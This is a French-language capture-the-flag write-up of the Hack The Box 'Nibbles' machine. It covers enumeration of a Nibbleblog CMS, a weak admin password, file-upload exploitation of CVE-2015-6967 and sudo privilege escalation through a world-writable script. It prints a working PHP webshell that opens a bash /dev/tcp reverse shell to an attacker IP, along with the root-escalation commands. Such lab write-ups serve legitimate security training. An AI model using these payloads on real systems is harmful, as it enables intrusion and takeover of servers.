---
title: "Hack The Box — Nibbles : Writeup"
date: 2026-08-23 00:00:00 +0100
categories: [Box, HackTheBox]
tags: [web, cms, information-disclosure, file-upload, privesc, sudo, linux, Hack The Box]
description: "Résolution de la machine Nibbles sur Hack The Box : énumération d'un CMS, contournement de blacklist, reverse shell manuel suite à l'échec de Metasploit, et élévation de privilèges via un script sudo modifiable."
image:
  path: /assets/img/htb/nibbles/nibbles-banner.png 
  alt: Nibbles Banner
---

# Hack The Box — Nibbles

## Informations sur la machine
- **Cible** : `10.129.70.167` *(Note : L'IP a changé en `10.129.70.177` après un reset de la machine dû au mécanisme de défense)*
- **Système d'exploitation** : Linux (Ubuntu)
- **Difficulté** : Facile

---

## 1. Reconnaissance avec Nmap
Comme pour tout test d'intrusion, la première étape consiste à cartographier la surface d'attaque en identifiant les ports et services exposés. J'utilise Nmap avec les options `-sC` (scripts par défaut) et `-sV` (détection de version).

```bash
nmap -sC -sV 10.129.70.167
```
**Résultat :** 
![nmap resultat](/assets/img/htb/nibbles/nmap_resultat.png)

Le scan révèle 2 ports ouverts :

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 7.2p2|
|80|HTTP|Apache httpd 2.4.18|

---

## 2. Découverte de contenu Web

Le port 80 héberge un serveur web. En consultant la page d'accueil (`http://10.129.70.167/`), je tombe sur un simple message "hello world".

![home page](/assets/img/htb/nibbles/home_page.png)

En inspectant le code source de la page, je découvre un commentaire révélant l'existence d'un répertoire caché : `/nibbleblog/`.

![code source](/assets/img/htb/nibbles/code_source.png)

En accédant à `http://10.129.70.167/nibbleblog/`, je confirme la présence d'un blog propulsé par le CMS **Nibbleblog**.

![blog](/assets/img/htb/nibbles/blog.png)

---

## 3. Énumération du CMS et Discovery

Ne trouvant rien d'exploitable directement, je lance une énumération des répertoires avec Gobuster pour identifier d'autres points d'entrée.

```bash
gobuster dir -u http://10.129.70.167/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js 2>/dev/null
```
**Résultat :** 
![gobuster](/assets/img/htb/nibbles/gobuster.png)

Les répertoires `/admin/` et `/content/` attirent mon attention. En explorant `/content/`, je remarque que l'arborescence des fichiers est accessible. 

![admin](/assets/img/htb/nibbles/admin.png)

Je n'ai rien trouvé d'intéressant du côté de /admin/. En naviguant vers `/content/private/`, je découvre des fichiers de configuration, dont `users.xml`.

![content](/assets/img/htb/nibbles/content.png)

![private](/assets/img/htb/nibbles/private.png)

![users](/assets/img/htb/nibbles/users.png)

En ouvrant `users.xml`, j'obtiens le nom d'utilisateur de l'administrateur qui est : `admin`.

---

## 4. Compromission du serveur

### 4.1. Authentification

J'ai obtenu le nom d'utilisateur puis je tente des mots de passe faibles courants sur le panneau d'administration (`/nibbleblog/admin.php`). Le mot de passe **`nibbles`** fonctionne immédiatement.

![dashboard](/assets/img/htb/nibbles/dashboard.png)


### 4.2. Identification de la vulnérabilité

Dans les paramètres du tableau de bord, j'identifie la version exacte du CMS : **Nibbleblog 4.0.3**. Une recherche rapide sur des bases de données de vulnérabilités (comme CVE Details ou Exploit-DB) révèle une faille critique : **CVE-2015-6967**. Il s'agit d'une vulnérabilité d'upload de fichier arbitraire dans le plugin "My Image".

![version](/assets/img/htb/nibbles/version.png)

![Exploit DB](/assets/img/htb/nibbles/exploit_db.png)

---

## 5. Obtention d'un Reverse Shell : Échec de Metasploit et approche manuelle

### 5.1. La tentative avec Metasploit

Dans un premier temps, j'ai tenté d'automatiser l'exploitation en utilisant le module Metasploit `exploit/multi/http/nibbleblog_file_upload`. Cependant, cette approche a rencontré deux obstacles majeurs :

1. **Instabilité du payload** : Le payload `php/meterpreter/reverse_tcp` est trop lourd pour cette version de PHP. Les sessions s'ouvraient (`Command shell session X opened`) mais se fermaient immédiatement, rendant l'interaction impossible.
2. **Mécanisme de défense (Blacklist)** : Le CMS Nibbleblog intègre un système de protection qui bloque l'adresse IP source après plusieurs tentatives de connexion échouées. Mes multiples essais ont conduit au blocage de mon IP, m'obligeant à **reset la machine** sur la plateforme pour réinitialiser la blacklist et l'état du système.

### 5.2. L'approche manuelle (Fiable)

Face à l'instabilité de Metasploit, je suis passé à une exploitation manuelle, plus légère et plus contrôlée.

1. **Création du payload** : Je crée un simple webshell PHP (`shell.php`) sur ma machine d'attaque :

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.252/4444 0>&1'");
?>
```
2. **Mise en écoute** : J'ouvre un listener Netcat sur mon port 4444.

```bash
nc -lnvp 4444
```

3. **Upload** : Via l'interface d'administration, je me rends dans **Plugins > My Image > Configure** et j'upload mon fichier `shell.php`. Le plugin ne vérifie pas correctement l'extension, acceptant le fichier PHP.
4. **Exécution** : Je déclenche le script en accédant à l'URL où il a été stocké : `http://10.129.70.177/nibbleblog/content/private/plugins/my_image/image.php`

Le listener capture immédiatement la connexion : 

![listener](/assets/img/htb/nibbles/listener.png)

---

## 6. Stabilisation du shell et récupération du flag utilisateur

Une fois le reverse shell obtenu, je le stabilise pour bénéficier de l'autocomplétion et d'un terminal propre :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Je me dirige ensuite vers le répertoire personnel de l'utilisateur `nibbler` pour récupérer le premier flag :

```bash
cd /home/nibbler
ls
cat user.txt
```

**Flag utilisateur** : `35**************************e78a`

---

## 7. Escalade de privilèges

### 7.1. Énumération des droits

Je vérifie les commandes que l'utilisateur `nibbler` peut exécuter avec les privilèges root via `sudo` :

```bash
sudo -l
```
**Résultat :**

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

C'est une piste très prometteuse. Cependant, le répertoire `/home/nibbler/personal/stuff/` n'existe pas encore. En listant le contenu de `/home/nibbler/`, je découvre un fichier archive : `personal.zip`.

### 7.2. Extraction et analyse

J'extrait l'archive pour obtenir le script :

```bash
unzip personal.zip
cd /home/nibbler/personal/stuff
ls -l monitor.sh
```

**Résultat :**

```text
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

**Analyse de la faille :** Le script appartient à `nibbler` et possède des permissions **777** (`-rwxrwxrwx`). Cela signifie que je peux le modifier. Puisque `sudo` permet de l'exécuter en tant que `root` sans mot de passe, je peux remplacer son contenu par une commande qui m'ouvrira un shell root.

---

## 8. Exploitation de l'escalade de privilèges

J'ai remplacer le contenu du fichier `monitor.sh` pour qu'il lance simplement un shell bash :

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
```

Ensuite, j'exécute le script avec les privilèges sudo :

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

Le prompt change immédiatement, indiquant que je suis désormais `root`.

---

## 9. Récupération du flag root

Je confirme mon identité et je récupère le dernier flag de la machine :

```bash
whoami
cd /root
cat root.txt
```

**Flag root** : `06**************************980f`

![root](/assets/img/htb/nibbles/root.png)

---

10. Chaîne d'exploitation (Kill Chain)

La compromission de la machine peut être résumée ainsi :

```text
Nmap (Ports 22, 80)
   │
   ▼
Inspection du code source HTML
   │
   ▼
Découverte du répertoire /nibbleblog/
   │
   ▼
Gobuster sur le CMS
   │
   ▼
Information Disclosure (users.xml) → Username: admin
   │
   ▼
Brute-force / Guessing → Password: nibbles
   │
   ▼
Identification version 4.0.3 → CVE-2015-6967
   │
   ▼
Échec Metasploit (Instabilité + Blacklist IP) → Reset Machine
   │
   ▼
Exploitation Manuelle : Upload PHP via plugin "My Image"
   │
   ▼
Reverse Shell (Utilisateur: nibbler)
   │
   ▼
Extraction de personal.zip
   │
   ▼
Analyse sudo -l → /home/nibbler/personal/stuff/monitor.sh (NOPASSWD)
   │
   ▼
Modification du script (Permissions 777)
   │
   ▼
Exécution sudo du script modifié
   │
   ▼
Shell Root & Flag final
```
---

## 11. Ce que j'ai appris

Cette machine, bien que classée "Facile", a été riche en enseignements pratiques :

1. **L'importance de l'inspection manuelle** : Un simple coup d'œil au code source peut révéler des chemins cachés que les outils automatisés pourraient manquer ou mettre plus de temps à trouver.
2. **Les limites des outils automatisés** : Mon expérience avec Metasploit m'a appris à ne pas dépendre aveuglément des frameworks. Comprendre _pourquoi_ un payload échoue (instabilité, blacklist) et savoir revenir à une méthode manuelle (création d'un webshell simple) est une compétence essentielle.
3. **Gestion des défenses actives** : J'ai appris à identifier les mécanismes de type "blacklist" et à savoir quand il est nécessaire de reset une machine de CTF pour repartir sur des bases saines.
4. **Escalade de privilèges via Sudo et permissions** : La combinaison d'un script exécutable via `sudo NOPASSWD` et de permissions d'écriture faibles (`777`) est un classique qu'il faut savoir identifier et exploiter rapidement en écrasant le fichier cible.
